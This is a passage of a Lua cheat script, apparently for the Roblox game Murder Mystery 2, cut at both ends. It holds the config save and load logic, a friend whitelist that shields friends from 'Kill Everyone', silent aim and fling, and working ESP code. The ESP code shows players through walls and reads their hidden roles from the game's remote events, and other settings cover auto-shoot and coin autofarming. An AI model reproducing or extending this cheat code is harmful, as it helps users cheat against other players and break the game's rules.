                    V.KnifeMaxDistance = decoded.KnifeMaxDistance
                    setUIVal(UIElements.KnifeMaxDistance, decoded.KnifeMaxDistance)
                end
                if decoded.KnifeThrowDelay ~= nil then
                    V.KnifeThrowDelay = decoded.KnifeThrowDelay
                    setUIVal(UIElements.KnifeThrowDelay, decoded.KnifeThrowDelay)
                end
                if decoded.AutoKnife ~= nil then
                    V.AutoKnife = decoded.AutoKnife
                    setUIVal(UIElements.AutoKnife, decoded.AutoKnife)
                end

                -- Sheriff Shoot Settings
                if decoded.RanaxShootingMethod ~= nil then
                    _G.RanaxShootingMethod = decoded.RanaxShootingMethod
                    setUIVal(UIElements.ShootingMethod, decoded.RanaxShootingMethod)
                end
                if decoded.RanaxSilentAimWallCheck ~= nil then
                    _G.RanaxSilentAimWallCheck = decoded.RanaxSilentAimWallCheck
                    setUIVal(UIElements.ShootV2WallCheck, decoded.RanaxSilentAimWallCheck)
                end
                if decoded.RanaxPredictionMultiplier ~= nil then
                    _G.RanaxPredictionMultiplier = decoded.RanaxPredictionMultiplier
                    setUIVal(UIElements.ShootV2PredictMultiplier, decoded.RanaxPredictionMultiplier)
                end
                if decoded.RanaxAutoShootV2 ~= nil then
                    _G.RanaxAutoShootV2 = decoded.RanaxAutoShootV2
                    setUIVal(UIElements.AutoShootV2, decoded.RanaxAutoShootV2)
                end
                if decoded.ShootV2FlickEnabled ~= nil then
                    _G.ShootV2FlickEnabled = decoded.ShootV2FlickEnabled
                    setUIVal(UIElements.ShootV2FlickToggle, decoded.ShootV2FlickEnabled)
                end
                if decoded.ShootV2FlickCamera ~= nil then
                    _G.ShootV2FlickCamera = decoded.ShootV2FlickCamera
                    setUIVal(UIElements.ShootV2FlickCamera, decoded.ShootV2FlickCamera)
                end
                if decoded.ShootV2FlickTurnTime ~= nil then
                    _G.ShootV2FlickTurnTime = decoded.ShootV2FlickTurnTime
                    setUIVal(UIElements.ShootV2FlickTurnTime, decoded.ShootV2FlickTurnTime)
                end
                if decoded.SheriffKillCamEnabled ~= nil then
                    _G.SheriffKillCamEnabled = decoded.SheriffKillCamEnabled
                    setUIVal(UIElements.SheriffKillCam, decoded.SheriffKillCamEnabled)
                end
                if decoded.SheriffKillSound ~= nil then
                    _G.SheriffKillSound = decoded.SheriffKillSound
                    setUIVal(UIElements.SheriffKillSound, decoded.SheriffKillSound)
                end
                if decoded.SheriffKillBanner ~= nil then
                    _G.SheriffKillBanner = decoded.SheriffKillBanner
                    setUIVal(UIElements.SheriffKillBanner, decoded.SheriffKillBanner)
                end
                if decoded.SheriffKillEffectStyle ~= nil then
                    _G.SheriffKillEffectStyle = decoded.SheriffKillEffectStyle
                    if UIElements.SheriffKillEffectStyle and UIElements.SheriffKillEffectStyle.SetValue then
                        pcall(function() UIElements.SheriffKillEffectStyle:SetValue(decoded.SheriffKillEffectStyle) end)
                    end
                end
                if decoded.SheriffKillCamDuration ~= nil then
                    _G.SheriffKillCamDuration = decoded.SheriffKillCamDuration
                    setUIVal(UIElements.SheriffKillCamDuration, decoded.SheriffKillCamDuration)
                end



                -- Coin Farm Settings
                if decoded.SafeAutoFarm ~= nil then
                    _G.SafeAutoFarm = decoded.SafeAutoFarm
                    _G.AutoCoins = decoded.SafeAutoFarm
                    setUIVal(UIElements.SafeAutoFarm, decoded.SafeAutoFarm)
                end
                if decoded.FarmSpeed ~= nil then
                    _G.FarmSpeed = decoded.FarmSpeed
                    setUIVal(UIElements.FarmSpeed, decoded.FarmSpeed)
                end
                if decoded.BagFullAction ~= nil then
                    _G.BagFullAction = decoded.BagFullAction
                    setUIVal(UIElements.BagFullAction, decoded.BagFullAction)
                end
                if decoded.RanaxAntiAFK ~= nil then
                    _G.RanaxAntiAFK = decoded.RanaxAntiAFK
                    setUIVal(UIElements.AntiAFK, decoded.RanaxAntiAFK)
                end
                if decoded.WebhookURL ~= nil then
                    _G.WebhookURL = decoded.WebhookURL
                end
                if decoded.WebhookEnabled ~= nil then
                    _G.WebhookEnabled = decoded.WebhookEnabled
                    setUIVal(UIElements.WebhookEnabled, decoded.WebhookEnabled)
                end

                -- Protection & Notifications
                if decoded.AntiFling ~= nil then
                    V.AntiFling = decoded.AntiFling
                    setUIVal(UIElements.AntiFling, decoded.AntiFling)
                end
                if decoded.AntiFlingThreshold ~= nil then
                    V.AntiFlingThreshold = decoded.AntiFlingThreshold
                end
                if decoded.ProtectFriends ~= nil then
                    V.ProtectFriends = decoded.ProtectFriends
                    setUIVal(UIElements.ProtectFriends, decoded.ProtectFriends)
                end
                if decoded.FriendSystemEnabled ~= nil then
                    getgenv().FriendSystemEnabled = decoded.FriendSystemEnabled
                    setUIVal(UIElements.FriendSystemToggle, decoded.FriendSystemEnabled)
                end
                if decoded.RanaxToastEnabled ~= nil then
                    getgenv().RanaxToastEnabled = decoded.RanaxToastEnabled
                    setUIVal(UIElements.ToastToggle, decoded.RanaxToastEnabled)
                end
                if decoded.RanaxNotifyEnabled ~= nil then
                    getgenv().RanaxNotifyEnabled = decoded.RanaxNotifyEnabled
                    setUIVal(UIElements.NotifyToggle, decoded.RanaxNotifyEnabled)
                end
                if decoded.RoleNotify ~= nil then
                    V.RoleNotify = decoded.RoleNotify
                end
                if decoded.SheriffDeathNotify ~= nil then
                    V.SheriffDeathNotify = decoded.SheriffDeathNotify
                    setUIVal(UIElements.SheriffDeathNotify, decoded.SheriffDeathNotify)
                end
                if decoded.CoinFarmAntiStuck ~= nil then
                    _G.CoinFarmAntiStuck = decoded.CoinFarmAntiStuck
                    setUIVal(UIElements.AntiStuck, decoded.CoinFarmAntiStuck)
                end
                if decoded.CoinFarmAntiStuckTimeout ~= nil then
                    _G.CoinFarmAntiStuckTimeout = decoded.CoinFarmAntiStuckTimeout
                    setUIVal(UIElements.AntiStuckTimeout, decoded.CoinFarmAntiStuckTimeout)
                end
                if decoded.CoinESPEnabled ~= nil then
                    _G.CoinESPEnabled = decoded.CoinESPEnabled
                    setUIVal(UIElements.CoinESPToggle, decoded.CoinESPEnabled)
                    setUIVal(UIElements.ESPCoinToggle, decoded.CoinESPEnabled)
                    if typeof(_G.toggleCoinESP) == "function" then
                        _G.toggleCoinESP(decoded.CoinESPEnabled)
                    end
                end

                -- Misc & Performance
                if decoded.SpeedGlitchBoost ~= nil then
                    _G.SpeedGlitchBoost = decoded.SpeedGlitchBoost
                    setUIVal(UIElements.SpeedGlitchBoost, decoded.SpeedGlitchBoost)
                end
                if decoded.RanaxSprayDecalID ~= nil then
                    _G.RanaxSprayDecalID = decoded.RanaxSprayDecalID
                end
                if decoded.AutoChatMurdDeath ~= nil then
                    _G.AutoChatMurdDeath = decoded.AutoChatMurdDeath
                    setUIVal(UIElements.AutoChatMurdDeathToggle, decoded.AutoChatMurdDeath)
                end
                if decoded.AutoChatMurdDeathMsg ~= nil then
                    _G.AutoChatMurdDeathMsg = decoded.AutoChatMurdDeathMsg
                end
                if decoded.AutoChatKill ~= nil then
                    _G.AutoChatKill = decoded.AutoChatKill
                    setUIVal(UIElements.AutoChatKillToggle, decoded.AutoChatKill)
                end
                if decoded.AutoChatKillMsg ~= nil then
                    _G.AutoChatKillMsg = decoded.AutoChatKillMsg
                end
                if decoded.FpsBoosterActive ~= nil then
                    _G.FpsBoosterActive = decoded.FpsBoosterActive
                    setUIVal(UIElements.FpsBoosterToggle, decoded.FpsBoosterActive)
                end

                
                -- ===== ESP MODULES RESTORE =====
                if decoded.PlayerESP ~= nil then
                    local targetTgl = UIElements.PlayerESPToggle or PlayerESPToggle
                    setUIVal(targetTgl, decoded.PlayerESP)
                end
                if decoded.NameESP ~= nil then
                    local targetTgl = UIElements.NameESPToggle or NameESPToggle
                    setUIVal(targetTgl, decoded.NameESP)
                end
                if decoded.GunDropESP ~= nil then
                    local targetTgl = UIElements.GunDropToggle or GunDropToggle
                    setUIVal(targetTgl, decoded.GunDropESP)
                end
                if decoded.TrapESP ~= nil then
                    local targetTgl = UIElements.TrapESPToggle or TrapESPToggle
                    setUIVal(targetTgl, decoded.TrapESP)
                end
                if decoded.CoinESP ~= nil then
                    _G.CoinESPEnabled = decoded.CoinESP
                    setUIVal(UIElements.CoinESPToggle or UIElements.ESPCoinToggle, decoded.CoinESP)
                    if typeof(_G.RanaxUpdateWorkspaceCoinWatchers) == "function" then _G.RanaxUpdateWorkspaceCoinWatchers() end
                    if typeof(_G.RanaxUpdateCoinDistListener) == "function" then _G.RanaxUpdateCoinDistListener(decoded.CoinESP) end
                end

                -- ===== MISC & UTILITIES RESTORE =====
                if decoded.AutoGrabGun ~= nil then
                    local targetTgl = UIElements.AutoGrabGunToggle or AutoGrabGunToggle
                    setUIVal(targetTgl, decoded.AutoGrabGun)
                end
                if decoded.RemoveBarriers ~= nil then
                    local targetTgl = UIElements.RemoveBarrierAutomaticToggle or RemoveBarrierAutomaticToggle
                    setUIVal(targetTgl, decoded.RemoveBarriers)
                end
                if decoded.SpeedGlitch ~= nil then
                    _G.SpeedGlitchActive = decoded.SpeedGlitch
                    setUIVal(_G.SpeedGlitchToggleRef, decoded.SpeedGlitch)
                end
                if decoded.FarmMode ~= nil then
                    if decoded.UndergroundFarm ~= nil then _G.UndergroundFarm = decoded.UndergroundFarm; setUIVal(UIElements.UndergroundFarm, decoded.UndergroundFarm) end
                    setUIVal(UIElements.FarmMode, decoded.FarmMode)
                end
                if decoded.LevelUpWebhook ~= nil then
                    setUIVal(UIElements.LevelUpWebhook, decoded.LevelUpWebhook)
                end

                -- ===== EMOTE SYSTEM RESTORE =====
                if decoded.SelectedEmote ~= nil then
                    _G.RanaxSelectedEmote = decoded.SelectedEmote
                end
                if decoded.EmoteLoop ~= nil then
                    _G.RanaxEmoteLoop = decoded.EmoteLoop
                end
                if decoded.EmoteWalk ~= nil then
                    _G.RanaxEmoteWalk = decoded.EmoteWalk
                end
                if decoded.EmoteSpeed ~= nil then
                    _G.RanaxEmoteSpeed = decoded.EmoteSpeed
                end

                -- ===== SKIN CHANGER RESTORE =====
                if _skinChanger then
                    if decoded.KnifeSkinEnabled ~= nil then _skinChanger.KnifeEnabled = decoded.KnifeSkinEnabled end
                    if decoded.SelectedKnife ~= nil then _skinChanger.SelectedKnife = decoded.SelectedKnife end
                    if decoded.GunSkinEnabled ~= nil then _skinChanger.GunEnabled = decoded.GunSkinEnabled end
                    if decoded.SelectedGun ~= nil then _skinChanger.SelectedGun = decoded.SelectedGun end
                    if decoded.ChromaRainbow ~= nil then
                        _skinChanger.ChromaRainbow = decoded.ChromaRainbow
                        if typeof(_G.RanaxUpdateChromaListener) == "function" then _G.RanaxUpdateChromaListener(decoded.ChromaRainbow) end
                    end
                    if decoded.ChromaSpeed ~= nil then _skinChanger.ChromaSpeed = decoded.ChromaSpeed end
                    if decoded.WeaponGlow ~= nil then _skinChanger.WeaponGlow = decoded.WeaponGlow end
                    if decoded.WeaponScale ~= nil then _skinChanger.WeaponScale = decoded.WeaponScale end
                end

                CurrentConfigName = name
                return true
            end
        end)
        if success then return true, name end
    end
    return false, "Not found"
end

local function DeleteConfig(name)
    if not name or name == "" then return false end
    EnsureConfigDir()
    local filePath = CONFIG_DIR .. "/" .. name .. ".json"
    local flatPath = "Ranax_" .. name .. ".json"
    local delFn = delfile or (syn and syn.delfile)
    if delFn then
        pcall(function() delFn(filePath) end)
        pcall(function() delFn(flatPath) end)
        return true
    end
    return false
end

EnsureConfigDir()

task.wait()
local SettingsTab = Window:Tab({
    Title = "Settings",
    Icon = "cog",
    Locked = false,
})

local Keybind
Keybind = SettingsTab:Keybind({
    Title = "GUI Keybind",
    Desc = "Keybind to Open / Close GUI (Press Delete for None)",
    Value = KeybindValues.GUIKeybind or "LeftControl",
    Callback = function(v)
        if tostring(v) == "Delete" or tostring(v) == "Backspace" or tostring(v) == "None" or v == nil then
            KeybindValues.GUIKeybind = "None"
            pcall(function()
                if getgenv then
                    getgenv().GUIKeybind = "None"
                    if getgenv().KeybindValues then
                        getgenv().KeybindValues.GUIKeybind = "None"
                    end
                end
            end)
            pcall(function() if Keybind and Keybind.SetValue then Keybind:SetValue("None") end end)
            pcall(function() Window:SetToggleKey(Enum.KeyCode.Unknown) end)
            return
        end
        local keyName = typeof(v) == "EnumItem" and v.Name or tostring(v):gsub("Enum.KeyCode.", "")
        KeybindValues.GUIKeybind = keyName
        pcall(function()
            if getgenv then
                getgenv().GUIKeybind = keyName
                if getgenv().KeybindValues then
                    getgenv().KeybindValues.GUIKeybind = keyName
                end
            end
        end)
        if typeof(v) == "EnumItem" then
            Window:SetToggleKey(v)
        elseif Enum.KeyCode[keyName] then
            Window:SetToggleKey(Enum.KeyCode[keyName])
        end
    end
})
UIElements.Keybind = Keybind

Window:Divider()

-- ==================== FRIEND SYSTEM UI ====================
local SelectedFriendForRemove = nil

SettingsTab:Section({
    Title = "Friend System",
    TextSize = 15
})

local FriendSystemToggle = SettingsTab:Toggle({
    Title = "Enable Friend System",
    Desc = "Protects whitelisted friends from Kill Everyone, Silent Aim, Knife Throw & Fling",
    Icon = "users-round",
    Type = "Checkbox",
    Value = true,
    Callback = function(state)
        getgenv().FriendSystemEnabled = state
    end
})
UIElements.FriendSystemToggle = FriendSystemToggle

local FriendListDropdown

local FriendInput = SettingsTab:Input({
    Title = "Add Friend / Whitelist",
    Icon = "user-plus",
    Placeholder = "Enter Username, DisplayName or UserId...",
    Callback = function(input)
        if not input or input:match("^%s*$") then
            notify("Friend System", "Enter a valid username", 3, "x")
            return
        end
        if AddFriend(input) then
            notify("Friend System", "Whitelisted: " .. input, 3, "check")
            pcall(function()
                if FriendListDropdown then
                    FriendListDropdown:Refresh(GetFriendList())
                end
            end)
        end
    end
})

FriendListDropdown = SettingsTab:Dropdown({
    Title = "Friends (select to remove)",
    Desc = "Saved friends whitelist",
    Values = GetFriendList(),
    Value = GetFriendList()[1],
    Multi = false,
    AllowNone = false,
    Callback = function(option)
        SelectedFriendForRemove = option
    end
})

local RemoveFriendButton = SettingsTab:Button({
    Title = "Remove Selected Friend",
    Desc = "Removes the player from your whitelist",
    Locked = false,
    Callback = function()
        local target = SelectedFriendForRemove
        if not target or target == "No friends" then
            WindUI:Notify({ Title = "Friend System", Content = "Select a friend first", Duration = 3, Icon = "x" })
            return
        end
        if RemoveFriend(target) then
            WindUI:Notify({ Title = "Friend System", Content = "Removed: " .. tostring(target), Duration = 3, Icon = "check" })
            SelectedFriendForRemove = nil
            pcall(function()
                local newList = GetFriendList()
                FriendListDropdown:Refresh(newList)
            end)
        end
    end
})

-- Friend listesini canli tut
SettingsTab:Divider()

-- ==================== CONFIG SYSTEM UI ====================
SettingsTab:Divider()

SettingsTab:Section({
    Title = "Config Manager",
    TextSize = 15
})

local ConfigInputName = "default"
local SelectedConfig = "default"
local ConfigDropdown

SettingsTab:Input({
    Title = "Config Name",
    Desc = "Enter a name to save or overwrite a preset",
    Placeholder = "e.g. legit, rage, default",
    Callback = function(val)
        if val and val ~= "" then
            ConfigInputName = val
        end
    end
})

ConfigDropdown = SettingsTab:Dropdown({
    Title = "Select Config",
    Desc = "Choose a saved config file",
    Values = GetConfigList(),
    Value = GetConfigList()[1] or "default",
    Multi = false,
    AllowNone = false,
    Callback = function(opt)
        SelectedConfig = opt
        ConfigInputName = opt
    end
})

local function refreshConfigDropdown()
    pcall(function()
        if ConfigDropdown then
            local list = GetConfigList()
            if typeof(ConfigDropdown.SetValues) == "function" then
                ConfigDropdown:SetValues(list)
            elseif typeof(ConfigDropdown.Refresh) == "function" then
                ConfigDropdown:Refresh(list)
            elseif typeof(ConfigDropdown.Set) == "function" then
                ConfigDropdown:Set(list)
            end
        end
    end)
end

SettingsTab:Button({
    Title = "Save Config",
    Desc = "Saves your current settings into the config",
    Locked = false,
    Callback = function()
        local target = (ConfigInputName and ConfigInputName ~= "") and ConfigInputName or (SelectedConfig or "default")
        local ok, res = SaveConfig(target)
        if ok then
            notify("Config", "Saved config: " .. tostring(res), 3, "check")
            refreshConfigDropdown()
        else
            notify("Config", "Failed to save config! (File write error)", 3, "x")
        end
    end
})

SettingsTab:Button({
    Title = "Load Config",
    Desc = "Loads settings from the selected config",
    Locked = false,
    Callback = function()
        local target = SelectedConfig or ConfigInputName or "default"
        local ok, res = LoadConfig(target)
        if ok then
            notify("Config", "Loaded config: " .. tostring(res), 3, "check")
        else
            notify("Config", "Failed to load: " .. tostring(target), 3, "x")
        end
    end
})

SettingsTab:Button({
    Title = "Delete Config",
    Desc = "Permanently deletes the selected config file",
    Locked = false,
    Callback = function()
        local target = SelectedConfig or ConfigInputName
        if DeleteConfig(target) then
            notify("Config", "Deleted: " .. tostring(target), 3, "check")
            refreshConfigDropdown()
        else
            notify("Config", "Could not delete: " .. tostring(target), 3, "x")
        end
    end
})

SettingsTab:Button({
    Title = "Refresh List",
    Desc = "Reloads all saved config files from disk",
    Locked = false,
    Callback = function()
        refreshConfigDropdown()
        notify("Config", "Config list refreshed", 2, "refresh-cw")
    end
})

SettingsTab:Section({ Title = "Community & Credits", TextSize = 15 })

SettingsTab:Paragraph({
    Title = "Developer & Credits",
    Desc = "Created by xCters | Discord User: xcters_Real\nOfficial Community: discord.gg/ranax"
})

SettingsTab:Button({
    Title = "Copy Discord Username (xcters_Real)",
    Desc = "Click to copy developer Discord username to clipboard",
    Locked = false,
    Callback = function()
        local setclip = setclipboard or toclipboard or (syn and syn.write_clipboard)
        if setclip then
            setclip("xcters_Real")
            notify("Discord", "Copied 'xcters_Real' to clipboard!", 3, "check")
        else
            notify("Discord", "xcters_Real", 4, "info")
        end
    end
})

SettingsTab:Button({
    Title = "Join Discord Community (discord.gg/ranax)",
    Desc = "Click to copy official Discord invite link",
    Locked = false,
    Callback = function()
        local setclip = setclipboard or toclipboard or (syn and syn.write_clipboard)
        if setclip then
            setclip("https://discord.gg/ranax")
            notify("Discord", "Copied invite link: discord.gg/ranax", 3, "check")
        else
            notify("Discord", "discord.gg/ranax", 4, "info")
        end
    end
})

task.wait()
local ESPTab = Window:Tab({
    Title = "ESP",
    Icon = "hat-glasses",
    Locked = false,
})

local function CleanupESP(envPrefix)
    local connections = {
        "RemoteConnection", "DataConnection", "RoundEndConnection", 
        "RoundStartConnection", "PlayerAdded", "PlayerRemoving"
    }
    
    for _, name in ipairs(connections) do
        local conn = getgenv()[envPrefix .. name]
        if conn then
            conn:Disconnect()
            getgenv()[envPrefix .. name] = nil
        end
    end
    
    local loop = getgenv()[envPrefix .. "RefreshLoop"]
    if loop then
        task.cancel(loop)
        getgenv()[envPrefix .. "RefreshLoop"] = nil
    end
    
    local charConns = getgenv()[envPrefix .. "Connections"]
    if charConns then
        for _, conn in pairs(charConns) do
            if conn then conn:Disconnect() end
        end
        getgenv()[envPrefix .. "Connections"] = {}
    end
    
    local objects = getgenv()[envPrefix .. "Objects"]
    if objects then
        for _, obj in pairs(objects) do
            if obj then pcall(function() obj:Destroy() end) end
        end
        getgenv()[envPrefix .. "Objects"] = {}
    end
    
    local rolesKey = envPrefix:gsub("ESP", "") .. "Roles"
    getgenv()[rolesKey] = {}
end

local RoleColors = {
    Murderer = Color3.fromRGB(255, 35, 35),
    Sheriff = Color3.fromRGB(0, 160, 255),
    Hero = Color3.fromRGB(255, 225, 20),
    Innocent = Color3.fromRGB(0, 255, 120)
}

local function GetToolType(player)
    if not player then return nil end
    local function checkContainer(container)
        if not container then return nil end
        for _, item in ipairs(container:GetChildren()) do
            if item:IsA("Tool") then
                local name = string.lower(item.Name)
                -- Knife check first
                if (typeof(isKnifeTool) == "function" and isKnifeTool(item)) or name:find("knife") or name:find("blade") or name:find("sword") or name:find("scythe") or name:find("dagger") or name:find("slash") or name:find("stab") then
                    return "Knife"
                -- Gun check with all MM2 gun names (Luger, Blaster, Laser, etc.)
                elseif (typeof(isGunTool) == "function" and isGunTool(item)) or name:find("gun") or name:find("revolver") or name:find("luger") or name:find("pistol") or name:find("blaster") or name:find("laser") or name:find("shotgun") or name:find("rifle") or item:FindFirstChild("GunDrop") or item:FindFirstChild("GunServer") then
                    return "Gun"
                end
            end
        end
        return nil
    end

    local backpack = player:FindFirstChild("Backpack")
    local character = player.Character

    local res = checkContainer(character) or checkContainer(backpack)
    return res
end

local function GetRoleColor(player, playerRoles)
    if not player then return RoleColors.Innocent end
    if IsFriend(player) then
        return getgenv().FriendColor or Color3.fromRGB(255, 140, 0)
    end

    playerRoles = playerRoles or GlobalPlayerRoles or getgenv().PlayerRoles or {}

    local roleData = nil
    for id, data in pairs(playerRoles) do
        if data and typeof(data) == "table" then
            if tostring(id) == tostring(player.UserId) or id == player.Name then
                roleData = data
                break
            end
        end
    end

    local toolType = GetToolType(player)
    if toolType == "Knife" or (roleData and roleData.Role == "Murderer") then
        return RoleColors.Murderer
    end

    if toolType == "Gun" then
        if roleData and roleData.Role == "Hero" then
            return RoleColors.Hero
        else
            return RoleColors.Sheriff
        end
    end

    if roleData then
        if roleData.Role == "Sheriff" then
            return RoleColors.Sheriff
        elseif roleData.Role == "Hero" then
            return RoleColors.Hero
        elseif roleData.Role == "Murderer" then
            return RoleColors.Murderer
        end
    end

    return RoleColors.Innocent
end

PlayerESPToggle = ESPTab:Toggle({

    Title = "Player ESP",
    Desc = "Allows you to see Players through walls",
    Icon = "eye",
    Type = "Checkbox",
    Value = false,
    Callback = function(state)
        if not state then
            CleanupESP("PlayerESP")
            return
        end
        
        getgenv().PlayerESPObjects = {}
        getgenv().PlayerESPConnections = {}
        getgenv().PlayerRoles = {}
        
        local function UpdateESPColor(player, esp)
            if not esp then return end
            local color = GetRoleColor(player, getgenv().PlayerRoles)
            esp.FillColor = color
            esp.OutlineColor = color
        end
        
        local function CreateESP(player)
            if player == LocalPlayer or not player.Character then return end
            
            if getgenv().PlayerESPObjects[player] then
                getgenv().PlayerESPObjects[player]:Destroy()
            end
            
            local esp = Instance.new("Highlight")
            esp.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
            esp.FillTransparency = 0.65
            esp.OutlineTransparency = 0.3
            esp.Parent = player.Character
            
            UpdateESPColor(player, esp)
            getgenv().PlayerESPObjects[player] = esp
        end
        
        local function SetupPlayer(player)
            if player == LocalPlayer then return end
            
            local function hookChar(char)
                if not char then return end
                CreateESP(player)
                
                local cConn = char.ChildAdded:Connect(function()
                    task.wait(0.05)
                    UpdateESPColor(player, getgenv().PlayerESPObjects[player])
                end)
                local cConn2 = char.ChildRemoved:Connect(function()
                    task.wait(0.05)
                    UpdateESPColor(player, getgenv().PlayerESPObjects[player])
                end)
                table.insert(getgenv().PlayerESPConnections, cConn)
                table.insert(getgenv().PlayerESPConnections, cConn2)
            end

            if player.Character then
                hookChar(player.Character)
            end
            
            local bp = player:FindFirstChild("Backpack")
            if bp then
                local bConn = bp.ChildAdded:Connect(function()
                    task.wait(0.05)
                    UpdateESPColor(player, getgenv().PlayerESPObjects[player])
                end)
                local bConn2 = bp.ChildRemoved:Connect(function()
                    task.wait(0.05)
                    UpdateESPColor(player, getgenv().PlayerESPObjects[player])
                end)
                table.insert(getgenv().PlayerESPConnections, bConn)
                table.insert(getgenv().PlayerESPConnections, bConn2)
            end
            
            local charConn = player.CharacterAdded:Connect(function(char)
                task.wait(0.3)
                hookChar(char)
            end)
            table.insert(getgenv().PlayerESPConnections, charConn)
        end
        
        getgenv().PlayerESPRemoteConnection = FadeEvent.OnClientEvent:Connect(function(data)
            if typeof(data) == "table" then
                getgenv().PlayerRoles = data
            end
        end)
        
        getgenv().PlayerESPDataConnection = DataChangedEvent.OnClientEvent:Connect(function(data)
            if typeof(data) == "table" then
                getgenv().PlayerRoles = data
                for plr, esp in pairs(getgenv().PlayerESPObjects) do
                    UpdateESPColor(plr, esp)
                end
            end
        end)
        
        getgenv().PlayerESPRoundEndConnection = RoundEndEvent.OnClientEvent:Connect(function()
            getgenv().PlayerRoles = {}
            for _, esp in pairs(getgenv().PlayerESPObjects) do
                if esp then
                    esp.FillColor = RoleColors.Innocent
                    esp.OutlineColor = RoleColors.Innocent
                end
            end
        end)
        
        for _, player in ipairs(Players:GetPlayers()) do
            SetupPlayer(player)
        end
        
        getgenv().PlayerESPPlayerAdded = Players.PlayerAdded:Connect(SetupPlayer)
        getgenv().PlayerESPPlayerRemoving = Players.PlayerRemoving:Connect(function(player)
            if getgenv().PlayerESPObjects[player] then
                getgenv().PlayerESPObjects[player]:Destroy()
                getgenv().PlayerESPObjects[player] = nil
            end
        end)
        
        getgenv().PlayerESPRefreshLoop = task.spawn(function()
            while true do
                task.wait(1.2)
                for _, player in ipairs(Players:GetPlayers()) do
                    if player ~= LocalPlayer then
                        if not getgenv().PlayerESPObjects[player] then
                            CreateESP(player)
                        else
                            UpdateESPColor(player, getgenv().PlayerESPObjects[player])
                        end
                    end
                end
            end
        end)
    end
})

local function getRanaxEspContainer()
    local coreOk, coreGui = pcall(function() return (typeof(gethui) == "function" and gethui()) or game:GetService("CoreGui") end)
    local targetParent = (coreOk and coreGui) or LocalPlayer:WaitForChild("PlayerGui")
    local container = targetParent:FindFirstChild("RanaxESPContainer")
    if not container then
        container = Instance.new("Folder")
        container.Name = "RanaxESPContainer"
        container.Parent = targetParent
    end
    return container
end

NameESPToggle = ESPTab:Toggle({
    Title = "Player Names ESP",
    Desc = "Shows username, role and distance above all players",
    Icon = "app-window",
    Type = "Checkbox",
    Value = false,
    Callback = function(state)
        if not state then
            CleanupESP("NameESP")
            pcall(function()
                local c = getRanaxEspContainer()
                if c then c:ClearAllChildren() end
            end)
            return
        end
        
        getgenv().NameESPObjects = {}
        getgenv().NameESPConnections = {}
        getgenv().NameRoles = {}
        
        local function GetPlayerRoleName(player)
            local color = GetRoleColor(player, getgenv().NameRoles)
            if color == RoleColors.Murderer then return "MURDERER" end
            if color == RoleColors.Sheriff then return "SHERIFF" end
            if color == RoleColors.Hero then return "HERO" end
            if IsFriend(player) then return "FRIEND" end
            return "INNOCENT"
        end

        local function UpdateNameESP(player, esp)
            if not esp or not esp.Parent then return end
            local char = player.Character
            if not char then return end
            
            local adorneePart = char:FindFirstChild("Head") or char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("UpperTorso") or char:FindFirstChild("Torso") or char.PrimaryPart
            if adorneePart and esp.Adornee ~= adorneePart then
                esp.Adornee = adorneePart
            end
            
            local label = esp:FindFirstChildOfClass("TextLabel")
            if label then
                local roleColor = GetRoleColor(player, getgenv().NameRoles)
                local roleName = GetPlayerRoleName(player)
                label.TextColor3 = roleColor
                
                local displayName = player.DisplayName
                local userName = player.Name
                local nameStr = (displayName and displayName ~= "" and displayName ~= userName) and (displayName .. " (@" .. userName .. ")") or userName
                
                label.Text = "[" .. roleName .. "] " .. nameStr
            end
        end
        
        local function CreateNameESP(player)
            if player == LocalPlayer then return end
            local char = player.Character
            if not char then return end
            
            local adorneePart = char:FindFirstChild("Head") or char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("UpperTorso") or char:FindFirstChild("Torso") or char.PrimaryPart
            if not adorneePart then return end
            
            local existing = getgenv().NameESPObjects[player]
            if existing and existing.Parent then
                existing.Adornee = adorneePart
                UpdateNameESP(player, existing)
                return
            end
            
            local esp = Instance.new("BillboardGui")
            esp.Name = "RanaxNameESP_" .. player.Name
            esp.Size = UDim2.new(0, 240, 0, 48)
            esp.AlwaysOnTop = true
            esp.MaxDistance = 10000
            esp.ResetOnSpawn = false
            esp.StudsOffset = Vector3.new(0, 3.2, 0)
            esp.Adornee = adorneePart
            esp.Parent = getRanaxEspContainer()
            
            local label = Instance.new("TextLabel")
            label.Size = UDim2.new(1, 0, 1, 0)
            label.BackgroundTransparency = 1
            label.TextStrokeTransparency = 0
            label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
            label.TextSize = 13
            label.Font = Enum.Font.GothamBold
            label.TextColor3 = GetRoleColor(player, getgenv().NameRoles)
            label.TextWrapped = false
            label.Parent = esp
            
            getgenv().NameESPObjects[player] = esp
            UpdateNameESP(player, esp)
        end
        
        local function SetupPlayer(player)
            if player == LocalPlayer then return end
            
            local function hookChar(char)
                if not char then return end
                task.wait(0.1)
                CreateNameESP(player)
                
                local cConn = char.ChildAdded:Connect(function()
                    task.wait(0.05)
                    UpdateNameESP(player, getgenv().NameESPObjects[player])
                end)
                local cConn2 = char.ChildRemoved:Connect(function()
                    task.wait(0.05)
                    UpdateNameESP(player, getgenv().NameESPObjects[player])
                end)
                table.insert(getgenv().NameESPConnections, cConn)
                table.insert(getgenv().NameESPConnections, cConn2)
            end

            if player.Character then
                hookChar(player.Character)
            end
            
            local bp = player:FindFirstChild("Backpack")
            if bp then
                local bConn = bp.ChildAdded:Connect(function()
                    task.wait(0.05)
                    UpdateNameESP(player, getgenv().NameESPObjects[player])
                end)
                local bConn2 = bp.ChildRemoved:Connect(function()
                    task.wait(0.05)
                    UpdateNameESP(player, getgenv().NameESPObjects[player])
                end)
                table.insert(getgenv().NameESPConnections, bConn)
                table.insert(getgenv().NameESPConnections, bConn2)
            end
            
            local charConn = player.CharacterAdded:Connect(function(char)
                task.wait(0.25)
                hookChar(char)
            end)
            table.insert(getgenv().NameESPConnections, charConn)
        end
        
        getgenv().NameESPRemoteConnection = FadeEvent.OnClientEvent:Connect(function(data)
            if typeof(data) == "table" then
                getgenv().NameRoles = data
            end
        end)
        
        getgenv().NameESPDataConnection = DataChangedEvent.OnClientEvent:Connect(function(data)
            if typeof(data) == "table" then
                getgenv().NameRoles = data
                for plr, esp in pairs(getgenv().NameESPObjects) do
                    UpdateNameESP(plr, esp)
                end
            end
        end)
        
        getgenv().NameESPRoundEndConnection = RoundEndEvent.OnClientEvent:Connect(function()
            getgenv().NameRoles = {}
            for plr, esp in pairs(getgenv().NameESPObjects) do
                UpdateNameESP(plr, esp)
            end
        end)
        
